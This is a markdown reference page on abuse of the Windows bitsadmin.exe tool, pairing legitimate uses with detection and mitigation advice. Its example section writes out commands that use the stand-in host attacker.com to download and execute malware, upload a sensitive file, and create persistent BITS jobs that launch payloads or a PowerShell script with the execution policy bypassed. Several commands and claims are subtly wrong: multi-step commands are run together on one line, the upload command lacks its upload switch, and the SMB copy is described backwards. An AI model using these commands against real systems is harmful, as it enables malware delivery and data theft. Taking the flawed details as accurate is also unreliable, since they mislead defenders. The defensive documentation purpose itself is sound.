# bitsadmin.exe
## What is it?
*```bitsadmin.exe``` (Background Intelligent Transfer Service Admin) is a **command-line tool** used to manage **BITS (Background Intelligent Transfer Service)**, a Windows component for **asynchronous, prioritized, and resumable file transfers** over HTTP or SMB.*  
*Attackers abuse ```bitsadmin.exe``` to **download malware, exfiltrate data, establish persistence, and evade security controls.***

*Since BITS is a **trusted Windows service**, its traffic is often **whitelisted** in security solutions, making detection more challenging.*

## Legitimate Usage
- **Windows Updates & Patching** → Download updates efficiently in the background.
- **Software Deployment** → Transfer application files between systems.
- **Large File Transfers** → Resume interrupted downloads without starting over.
- **Syncing Data Across Devices** → Manage background transfers for Microsoft services.

## How to abuse it
- **Stealthy Malware Download** → Retrieve malicious payloads while evading detection.
- **Data Exfiltration** → Upload stolen data without triggering alerts.
- **Persistence via BITS Jobs** → Schedule repeated execution of malicious commands.
- **Execution of Remote Payloads** → Download and run malware directly from attacker-controlled servers.

## Example Attacks
### 1. Download & Execute a Malicious File
*Attackers can abuse BITSAdmin to retrieve and execute malware remotely.*

```
bitsadmin /transfer MalwareDownload http://attacker.com/malware.exe C:\Users\Public\malware.exe start C:\Users\Public\malware.exe
```

**Effect:**
- Downloads ```malware.exe``` to ```C:\Users\Public\```.
- Executes the malware, bypassing some security controls.

### 2. Data Exfiltration via BITS
*Attackers can silently upload stolen files to a remote server using BITSAdmin.*

```
bitsadmin /transfer DataExfil http://attacker.com/upload C:\SensitiveData.txt
```

**Effect:**
- Sends ```SensitiveData.txt``` to ```attacker.com``` without triggering common monitoring tools.

### 3. Persistence via Malicious BITS Job
*BITS jobs can be scheduled to **run malicious commands** repeatedly, ensuring persistence.*

```
bitsadmin /create PersistentJob bitsadmin /addfile PersistentJob http://attacker.com/payload.exe C:\Windows\Temp\payload.exe bitsadmin /SetNotifyCmdLine PersistentJob C:\Windows\Temp\payload.exe NULL bitsadmin /Resume PersistentJob
```

**Effect:**
- Downloads ```payload.exe``` and **executes it on completion**.
- **Resurrects itself** even after system reboots.

### 4. Execution Without a Visible Window
*Malware authors use BITSAdmin to execute payloads in the background without a visible process.*

```
bitsadmin /create HiddenJob bitsadmin /addfile HiddenJob http://attacker.com/script.ps1 C:\Windows\Temp\script.ps1 bitsadmin /SetNotifyCmdLine HiddenJob powershell.exe "-ExecutionPolicy Bypass -File C:\Windows\Temp\script.ps1" bitsadmin /Resume HiddenJob
```

**Effect:**
- Downloads and runs ```script.ps1``` using **PowerShell**, hiding execution from users.

### 5. Lateral Movement via SMB
*Attackers can copy files over SMB using BITSAdmin, bypassing network restrictions.*

```
bitsadmin /transfer LateralMove \192.168.1.100\share\malware.exe C:\Windows\Temp\malware.exe
```

**Effect:**
- Moves ```malware.exe``` to ```192.168.1.100```, allowing lateral movement.

## Detection & Mitigation
### Detection Methods
**Monitor Suspicious BITS Jobs**
- **Event ID 4698 (Scheduled Task Creation)** → Detect persistent BITS jobs.
- **Event ID 7035 & 7036 (BITS Service Start/Stop)** → Identify abnormal BITS activity.

**Detect Unusual Network Traffic**
- **Event ID 5156 (Outbound Network Connection)** → Identify unauthorized HTTP transfers.
- **Monitor for BITSAdmin usage with non-legitimate domains.**

**Identify Execution of Remote Payloads**
- **Check command-line logs for ```bitsadmin /transfer``` followed by executable launches.**
- **Monitor process creation for execution of downloaded files.**

### Mitigation Strategies
- **Restrict BITSAdmin Usage** → Use AppLocker or WDAC to block ```bitsadmin.exe```.
- **Limit Internet Access for BITS** → Restrict BITS to only access trusted domains.
- **Monitor and Clear Suspicious BITS Jobs** → Regularly review ```bitsadmin /list``` for unknown transfers.
- **Enable Logging for BITS Events** → Track and alert on BITS file transfers.
